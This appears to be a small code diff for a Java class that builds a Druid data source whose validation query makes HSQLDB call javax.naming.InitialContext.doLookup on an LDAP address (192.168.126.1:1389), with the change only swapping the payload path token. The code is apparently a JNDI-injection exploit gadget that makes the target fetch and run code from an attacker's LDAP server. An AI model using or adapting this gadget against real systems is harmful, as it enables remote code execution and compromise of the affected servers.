@@ -10,7 +10,7 @@ public class Druid {
         DruidDataSource druidDataSource = new DruidDataSource();
         druidDataSource.setDriverClassName("org.hsqldb.jdbc.JDBCDriver");
         druidDataSource.setUrl("jdbc:hsqldb:mem");
-        druidDataSource.setValidationQuery("CALL \"javax.naming.InitialContext.doLookup\"('ldap://192.168.126.1:1389/jkzpei')");
+        druidDataSource.setValidationQuery("CALL \"javax.naming.InitialContext.doLookup\"('ldap://192.168.126.1:1389/7jj0mb')");
 //        druidDataSource.setUsername("sa");
 //        druidDataSource.setPassword("1");
         druidDataSource.setInitialSize(1);
